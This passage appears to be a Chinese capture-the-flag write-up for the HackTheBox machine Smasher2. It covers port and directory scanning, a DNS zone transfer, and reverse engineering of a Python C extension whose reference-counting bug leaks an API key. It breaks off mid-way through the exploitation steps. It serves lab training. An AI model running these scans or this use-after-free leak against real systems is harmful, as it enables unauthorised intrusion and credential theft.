<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- --min-rate 10000 10.10.10.135 -v -sV (快速扫描所有开放的tcp端口)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22,53,80 -sC -sV -A -v 10.10.10.135 (扫描端口开放的服务)</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:<span class="built_in">fc</span>:20:4e:5a (RSA)</span><br><span class="line">|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)</span><br><span class="line">|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -sU -p- --min-rate 10000 -v 10.10.10.135 (快速扫描开放的udp端口)</span></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/udp open  domain</span><br></pre></td></tr></table></figure>

<p>dirb爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://10.10.10.135/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 26 20:55:10 2019</span><br><span class="line">URL_BASE: http://10.10.10.135/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.135/ ----</span><br><span class="line">+ http://10.10.10.135/.config (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:314)                             </span><br><span class="line">+ http://10.10.10.135/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:315)                            </span><br><span class="line">+ http://10.10.10.135/_vti_bin/shtml.dll (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/akeeba.backend.log (CODE:403|SIZE:305)                                      </span><br><span class="line">+ http://10.10.10.135/awstats.conf (CODE:403|SIZE:299)                                            </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.135/backup/                                                        </span><br><span class="line">+ http://10.10.10.135/development.log (CODE:403|SIZE:302)                                         </span><br><span class="line">+ http://10.10.10.135/global.asa (CODE:403|SIZE:297)                                              </span><br><span class="line">+ http://10.10.10.135/global.asax (CODE:403|SIZE:298)                                                            </span><br><span class="line">+ http://10.10.10.135/index.html (CODE:200|SIZE:10918)                                                           </span><br><span class="line">+ http://10.10.10.135/main.mdb (CODE:403|SIZE:295)                                                               </span><br><span class="line">+ http://10.10.10.135/php.ini (CODE:403|SIZE:294)                                                 </span><br><span class="line">+ http://10.10.10.135/production.log (CODE:403|SIZE:301)                                          </span><br><span class="line">+ http://10.10.10.135/readfile (CODE:403|SIZE:414)                                                </span><br><span class="line">+ http://10.10.10.135/server-status (CODE:403|SIZE:300)                                           </span><br><span class="line">+ http://10.10.10.135/spamlog.log (CODE:403|SIZE:298)                                             </span><br><span class="line">+ http://10.10.10.135/thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/Thumbs.db (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://10.10.10.135/WS_FTP.LOG (CODE:403|SIZE:297) </span><br></pre></td></tr></table></figure>

<p>发现backup目录,这个把靶场刚发布时，/backup受.htpassword保护，该密码作为基本身份验证的弹出窗口显示，需要用hydra爆破用户名和密码，使用kali中的rockyou.txt字典。 但是现在此内容已从box中移除，因此，如果现在访问/backup，则会直接将您带进去。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb3.jpg"></p>
<p>下载这两个文件。</p>
<p>由于53的tcp/udp端口都开放了，TCP上的DNS通常仅对区域传输开放。 这是要尝试的第一件事。 猜想域名是smasher.htb和smasher2.htb。 返回有趣的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dig axfr @10.10.10.135 smasher2.htb</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.135 smasher2.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">smasher2.htb.           604800  IN      NS      smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      A       127.0.0.1</span><br><span class="line">smasher2.htb.           604800  IN      AAAA    ::1</span><br><span class="line">smasher2.htb.           604800  IN      PTR     wonderfulsessionmanager.smasher2.htb.</span><br><span class="line">smasher2.htb.           604800  IN      SOA     smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 265 msec</span><br><span class="line">;; SERVER: 10.10.10.135<span class="comment">#53(10.10.10.135)</span></span><br><span class="line">;; WHEN: 四 12月 26 21:25:05 EST 2019</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 242)</span><br></pre></td></tr></table></figure>

<p>将下面ip地址和3个域名添加到hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.135 wonderfulsessionmanager.smasher2.htb smasher2.htb root.smasher2.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb4.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3Jvb3Quc21hc2hlcjIuaHRiL2JhY2t1cC8lRTUlOEYlOTElRTclOEUlQjAlRTglQkYlOTglRTYlOTglQUYlRTUlOEUlOUYlRTYlOUQlQTUlRTclOUElODQlRTklQTElQjUlRTklOUQlQTIlRTUlQTYlODIlRTQlQjglOEIlRTUlOUIlQkUlRTYlODklODAlRTclQTQlQkE=">http://root.smasher2.htb/backup/发现还是原来的页面如下图所示<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb5.jpg"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL3dvbmRlcmZ1bHNlc3Npb25tYW5hZ2VyLnNtYXNoZXIyLmh0Yi8lRTUlQTYlODIlRTQlQjglOEI=">http://wonderfulsessionmanager.smasher2.htb/如下<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb6.jpg"></p>
<p>点击try login登录</p>
<ul>
<li>查看之前下载的python文件的源码</li>
</ul>
<p>从/backup提取的两个文件构成了Python Flask Web应用程序。 主要代码是auth.py。 第二行是import ses，像其他Python模块一样加载.so共享库。</p>
<p>ses库用于在应用程序启动时创建具有登录凭据的对象。 不幸的是，用户名和密码已从以下备用代码中删除：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def safe_init_manager(id):</span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">if</span> id <span class="keyword">in</span> Managers:</span><br><span class="line">        del Managers[id]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">            Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br><span class="line">    lock.release()</span><br></pre></td></tr></table></figure>

<p>Flask应用程序具有以@app.before_request修饰的before_request函数，因此它将在将每个请求传递给路由处理代码之前与每个请求一起运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> not session.has_key(<span class="string">&quot;id&quot;</span>):</span><br><span class="line">            k = get_secure_key()</span><br><span class="line">            safe_init_manager(k)</span><br><span class="line">            session[<span class="string">&quot;id&quot;</span>] = k</span><br><span class="line">        <span class="keyword">elif</span> session.has_key(<span class="string">&quot;id&quot;</span>) and not safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            del session[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.has_key(<span class="string">&quot;id&quot;</span>) and safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            pass</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br></pre></td></tr></table></figure>
<p>此代码确保为每次访问创建一个会话，或者将其重定向到/。<br>该应用程序有五个路径，/assets/<span class="exturl" data-url="cGF0aDpmaWxlbmFtZQ==">path:filename<i class="fa fa-external-link-alt"></i></span>, /, /login, /auth, /api。 最后两个最有趣。</p>
<h4 id="Shell-as-dzonerzy"><a href="#Shell-as-dzonerzy" class="headerlink" title="Shell as dzonerzy"></a>Shell as dzonerzy</h4><ul>
<li>获取API密钥</li>
</ul>
<p>尝试登录该页面时，有一个POST到/auth。 看一下这段代码，就会发现以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/auth&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def login():</span><br><span class="line">    ret = &#123;<span class="string">&quot;authenticated&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    data = request.get_json(silent=True)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        try:</span><br><span class="line">            tmp_login = dict(data[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        tmp_user_login = None</span><br><span class="line">        try:</span><br><span class="line">            is_logged = manager.check_login(data)</span><br><span class="line">            secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br><span class="line">            try:</span><br><span class="line">                tmp_user_login = &#123;<span class="string">&quot;username&quot;</span>: tmp_login[<span class="string">&quot;username&quot;</span>], <span class="string">&quot;password&quot;</span>: tmp_login[<span class="string">&quot;password&quot;</span>]&#125;</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> tmp_user_login is not None:</span><br><span class="line">                    log_creds(request.remote_addr, tmp_user_login)</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = &#123;<span class="string">&quot;endpoint&quot;</span>: secret_token_info[0], <span class="string">&quot;key&quot;</span>: secret_token_info[1], <span class="string">&quot;creation_date&quot;</span>: secret_token_info[2]&#125;</span><br><span class="line">        except TypeError as e:</span><br><span class="line">            ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = str(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate missing parameters.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>现在是需要了解依赖于ses.so中的模块的manager对象的地方。 下图是上面is_logged = manager.check_login(data)调用的can_login函数在Ida Pro中的样子：</p>
<p><img src="https://0xdf.gitlab.io/img/1570903084609.png"></p>
<p>国外大佬的图分析的很清楚，再次膜拜</p>
<p>关于Python代码的另一条注释-api密钥（存储为manager.secret_key）在此处设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.join(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>craft_secure_token()，它只是获取输入并对其进行hash处理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def craft_secure_token(content):</span><br><span class="line">    h = hmac.new(<span class="string">&quot;HMACSecureKey123!&quot;</span>, base64.b64encode(content).encode(), hashlib.sha256)</span><br><span class="line">    <span class="built_in">return</span> h.hexdigest()</span><br></pre></td></tr></table></figure>
<p>这意味着只要用户名和密码不变，API密钥也不会改变。</p>
<h3 id="方法1：利用引用计数"><a href="#方法1：利用引用计数" class="headerlink" title="方法1：利用引用计数"></a>方法1：利用引用计数</h3><p>这是预期的方法，但是很难发现.</p>
<p>Python对象是在堆上分配的，并且保留引用计数以监视它们是否在使用中，并且当引用计数达到0时，垃圾收集器将释放空间。 在编写Python代码时，将为您进行管理。 但是一旦开始编写C扩展名（编译为.so文件），就必须<span class="exturl" data-url="aHR0cDovL2VkY2pvbmVzLnRyaXBvZC5jb20vcmVmY291bnQuaHRtbA==">manage these references yourself<i class="fa fa-external-link-alt"></i></span>。 有<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy44L2MtYXBpL3JlZmNvdW50aW5nLmh0bWw=">series of C macros<i class="fa fa-external-link-alt"></i></span>将有助于实现这一目标。 可以通过在CPython源代码中查看<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvbWFzdGVyL0luY2x1ZGUvb2JqZWN0Lmg=">object.c<i class="fa fa-external-link-alt"></i></span>来查看Python对象。</p>
<p>首先，我将看到对象结构使得任何对象中的第一个值都是ob_refcnt，即引用计数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typedef struct _object &#123;</span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    struct _typeobject *ob_type;</span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure>

<p>我还可以看到PyINCREF(op)宏基本上只是对_PyINCREF的调用，该调用基本上只是向该引用计数器值添加一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">static inline void _Py_INCREF(PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    _Py_INC_REFTOTAL;</span><br><span class="line">    op-&gt;ob_refcnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_INCREF(op) _Py_INCREF(_PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>类似地，如果查看Py_DECREF，则相同，除了代码运行不仅会减少引用计数器，而且如果该计数器为0，它将在对象上调用_Py_Dealloc：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">static inline void _Py_DECREF(const char *filename, int lineno,</span><br><span class="line">                              PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    (void)filename; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    (void)lineno; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    _Py_DEC_REFTOTAL;</span><br><span class="line">    <span class="keyword">if</span> (--op-&gt;ob_refcnt != 0) &#123;</span><br><span class="line"><span class="comment">#ifdef Py_REF_DEBUG</span></span><br><span class="line">        <span class="keyword">if</span> (op-&gt;ob_refcnt &lt; 0) &#123;</span><br><span class="line">            _Py_NegativeRefcount(filename, lineno, op);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _Py_Dealloc(op);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_DECREF(op) _Py_DECREF(__FILE__, __LINE__, _PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>根据文档，_Py_Dealloc没有在此定义，因为它仅在解释器代码中使用。<br>我将在Ghidra中打开该模块，然后看一下反汇编。 当我开始学习具有这些知识的代码时，便开始看到我认为这些宏的实例。 例如，在SessionManager_check_login中，在第44行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">post_has_data = dict_contains(post_data,&amp;data);</span><br><span class="line"><span class="keyword">if</span> ((char)post_has_data != <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">  *post_data = *post_data + -1;</span><br><span class="line">  <span class="keyword">if</span> (*post_data == 0) &#123;</span><br><span class="line">    (**(code **)(post_data[1] + 0x30))(post_data);</span><br><span class="line">  &#125;</span><br><span class="line">  plVar2 = (long *)ErrorMsg(PyExc_TypeError,<span class="string">&quot;Missing data parameter&quot;</span>,parameter,uVar3,in_R8B,in_R9B</span><br><span class="line">                            ,(char)parameter);</span><br><span class="line">  goto LAB_0010250e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用dict_contains来查看传递给它的（我的POST）是否是包含键“data”的字典。 如果返回的结果不为true（’\ x01’），则它将递减参考计数器，然后检查它是否现在为0。如果是，则其自身将调用post_data [1] + 0x30。</p>
<p>由于我知道post_data是一个字典对象，因此我可以查看dictobject.c的Python源代码，以了解结构的定义位置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PyTypeObject PyDictIterItem_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</span><br><span class="line">    <span class="string">&quot;dictionary-itemiterator&quot;</span>,                  /* tp_name */</span><br><span class="line">    sizeof(dictiterobject),                     /* tp_basicsize */</span><br><span class="line">    0,                                          /* tp_itemsize */</span><br><span class="line">    /* methods */</span><br><span class="line">    (destructor)dictiter_dealloc,               /* tp_dealloc */</span><br><span class="line">    0,                                          /* tp_print */</span><br><span class="line">    0,                                          /* tp_getattr */</span><br><span class="line">    0,                                          /* tp_setattr */</span><br><span class="line">    0,                                          /* tp_compare */</span><br><span class="line">    0,                                          /* tp_repr */</span><br><span class="line">    0,                                          /* tp_as_number */</span><br><span class="line">    0,                                          /* tp_as_sequence */</span><br><span class="line">    0,                                          /* tp_as_mapping */</span><br><span class="line">    0,                                          /* tp_hash */</span><br><span class="line">    0,                                          /* tp_call */</span><br><span class="line">    0,                                          /* tp_str */</span><br><span class="line">    PyObject_GenericGetAttr,                    /* tp_getattro */</span><br><span class="line">    0,                                          /* tp_setattro */</span><br><span class="line">    0,                                          /* tp_as_buffer */</span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,/* tp_flags */</span><br><span class="line">    0,                                          /* tp_doc */</span><br><span class="line">    (traverseproc)dictiter_traverse,            /* tp_traverse */</span><br><span class="line">    0,                                          /* tp_clear */</span><br><span class="line">    0,                                          /* tp_richcompare */</span><br><span class="line">    0,                                          /* tp_weaklistoffset */</span><br><span class="line">    PyObject_SelfIter,                          /* tp_iter */</span><br><span class="line">    (iternextfunc)dictiter_iternextitem,        /* tp_iternext */</span><br><span class="line">    dictiter_methods,                           /* tp_methods */</span><br><span class="line">    0,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>知道PyVarObject_HEAD_INIT扩展为1，类型，大小，并假设每个单词为8字节，则0x30字节为（（析构函数）dictiter_dealloc）。<br>因此，回过头来，发现了Py_DECREF宏的外观。<br>同样，我在代码中看到的地方如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*data_object = *data_object + 1;</span><br></pre></td></tr></table></figure>

<p>这是Py_INCREF宏扩展的。<br>在此基础上，我将回到手头的代码。 错误在于如何跟踪从请求中读取的Python对象数据的引用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data = request.get_json(silent=True)</span><br></pre></td></tr></table></figure>
<p>稍后将其传递到manager.check_login中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br></pre></td></tr></table></figure>

<p>结果is_logged包含is_logged[1]中原始提交的json，该错误消息中引用了json：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>如果登录失败，则会显示POSTED JSON来代替前一个％s：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;authenticated&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span>: <span class="string">&quot;Cannot authenticate with data: &#123;u&#x27;username&#x27;: u&#x27;0xdf&#x27;, u&#x27;password&#x27;: u&#x27;password&#x27;&#125; - Try again!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在C中，我可以在变量声明之后的第二行看到创建新列表对象的地方：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">return_list_object = (long *)PyList_New(2);</span><br></pre></td></tr></table></figure>
<p>再向下一点，在检查关键数据是否在发布的JSON/字典中之后，它将数据对象读入一个对象，我将其命名为dataobject：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data_object = (long *)get_dict_key(post_data,&amp;data);</span><br></pre></td></tr></table></figure>

<p>接下来是一个阻止程序，用于检查用户是否被阻止并进行处理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user_is_blocked = is_blocked(user_login);</span><br><span class="line"><span class="keyword">if</span> ((char)user_is_blocked == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">  user_is_blocked = can_login(user_login);</span><br><span class="line">  <span class="keyword">if</span> ((char)user_is_blocked != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    set_unblocked(user_login);</span><br><span class="line">    set_login_count(user_login,0);</span><br><span class="line">  &#125;</span><br><span class="line">  local_50 = (long *)PyBool_FromLong(0);</span><br><span class="line">  *local_50 = *local_50 + 1;</span><br><span class="line">  *(long **)return_list_object[3] = local_50;</span><br><span class="line">  *data_object = *data_object + 1;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我将注意到，将创建一个布尔False（然后将引用计数器增加Py_INCREF），并将其存储在列表对象的第三个单词中。 然后，将data_object传递给Py_INCREF，然后将其设置为8个字节到同一第三个对象中。 因此，列表中的第三个对象必须是列表本身（第一个对象是引用计数）。 在此函数的最后，我看到这是返回的对象：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br><span class="line">LAB_0010250e:</span><br><span class="line">  <span class="keyword">if</span> (local_20 != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> plVar2;</span><br></pre></td></tr></table></figure>

<p>列表对象上的引用计数增加，然后将其设置为plVar2并返回。<br>如果未阻止用户，则可以看到类似的模式。 将检查登录计数，该计数小于10，它将从POSTed JSON和内部存储中加载用户名和密码。 然后，我将在此处显示三种可能的路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  __s2 = (char *)get_internal_usr(user_login);</span><br><span class="line">  success = strcmp(username_string,__s2);</span><br><span class="line">  <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">    __s2 = (char *)get_internal_pwd(user_login);</span><br><span class="line">    success = strcmp(password_string,__s2);</span><br><span class="line">    <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">      puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">      return_value = PyBool_FromLong(1);</span><br><span class="line">      *puVar1 = return_value;</span><br><span class="line">      *data_object = *data_object + 1;</span><br><span class="line">      *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">      goto LAB_001024c5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *data_object = *data_object + 1;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  set_blocked(user_login);</span><br><span class="line">  local_48 = (long *)PyBool_FromLong(1);</span><br><span class="line">  *local_48 = *local_48 + 1;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个是用户名和密码是否匹配。 它在data_object上调用Py_INCREF，将其设置为列表中的8个字节，并将列表中的0个字节设置为True。<br>如果用户名或密码失败，则将其Py_INCREFs data_ojbect设置为列表中的第一项为False，将data_object上的名称为Py_INCREF，然后将data_object置于第二项。<br>第三个路径是登录计数不小于10。它将第一个列表项设置为False，将第二个列表项设置为data_object。<br>缺少了什么？ 它没有增加data_object的引用计数！ 下一个代码（所有路径都经过）是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LAB_001024c5:</span><br><span class="line">  *data_object = *data_object + -1;</span><br><span class="line">  <span class="keyword">if</span> (*data_object == 0) &#123;</span><br><span class="line">    (**(code **)(data_object[1] + 0x30))(data_object);</span><br><span class="line">  &#125;</span><br><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br></pre></td></tr></table></figure>

<p>这是data_object上的Py_DECREF。<br>这是什么意思？ 在此调用结束时，如果它是第11次失败的登录，则具有用户名和密码的data_object将被标记为不再引用，因此将打开以进行垃圾回收，即使当相同的内存将在错误消息中打印出来时， 代码重新回到Python中。<br>事实证明，在调用manager.check_login（data）之后，无论check_login的结果如何，它都会创建一个对象：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br><span class="line">secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br></pre></td></tr></table></figure>

<p>几行后，识别出登录失败并构造了消息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">    ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">    ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<ul>
<li><p>我发送10个失败的登录名。用户状态未设置为已阻止。</p>
</li>
<li><p>我发送了第11次登录尝试，但登录数据已修改，因此它包含与secret_token_info相同的结构，并带有两个字符串和一个int的列表，而不是该站点发送的是带有两个键的字典。</p>
</li>
<li><p>manager.check_login（）由于该块而将失败，并减少data_object上的引用计数，从而使垃圾收集器将堆上的该空间标记为已打开。</p>
</li>
<li><p>该程序在堆上为secret_token_info分配空间，secret_token_info是一个具有两个字符串和一个int的Python对象。由于data_object进行垃圾回收之前所在的空间仅为该大小，因此它将使用该空间。</p>
</li>
